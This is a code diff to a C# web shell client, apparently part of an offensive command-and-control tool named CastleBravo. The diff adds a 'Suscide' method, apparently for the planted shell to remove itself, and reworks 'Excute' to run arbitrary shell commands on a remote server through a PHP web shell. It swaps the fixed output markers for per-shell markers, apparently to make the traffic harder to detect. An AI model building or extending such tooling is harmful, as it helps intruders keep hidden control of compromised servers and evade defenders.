@@ -24,6 +24,10 @@ namespace C2.Business.CastleBravo.WebShellTool
             this.client = ClientFactory.Create(password, clientSetting);
         }
 
+        public string Suscide()
+        {
+            return Post(this.client.Suscide());
+        }
         public Tuple<string, string> ShellStart()
         {
             List<string> paths = PHPIndex();
@@ -32,19 +36,23 @@ namespace C2.Business.CastleBravo.WebShellTool
 
         public Tuple<string, string> Excute(string root, string command)
         {
+            Tuple<string, string> shellParams = client.GetShellParams();
+            string splitS = shellParams.Item1;
+            string splitE = shellParams.Item2;
+
             //需要先判断是什么系统
             bool isLinux = root.StartsWith("/");
             string shellEnv = isLinux ? "/bin/sh" : "cmd";
-            string template = isLinux ? "cd \"{0}\";{1};echo [S];pwd;echo [E]" : "cd /d \"{0}\"&{1}&echo [S]&cd&echo [E]";
+            string template = isLinux ? "cd \"{0}\";{1};echo " + splitS + ";pwd;echo " + splitE : "cd /d \"{0}\"&{1}&echo " + splitS + "&cd&echo "+ splitE;
             
             string remoteCmd = string.Format(template, root, command);
 
-            string[] ret = PHPShell(shellEnv, remoteCmd).Split("[S]");
+            string[] ret = PHPShell(shellEnv, remoteCmd).Split(splitS);
 
             try
             {
                 ret[0] = isLinux ? ret[0].Replace("\n", "\r\n") : ret[0];
-                root   = ret[1].Split("[E]")[0].Trim(new char[] { '\n', '\r' });
+                root   = ret[1].Split(splitE)[0].Trim(new char[] { '\n', '\r' });
             }
             catch
             {
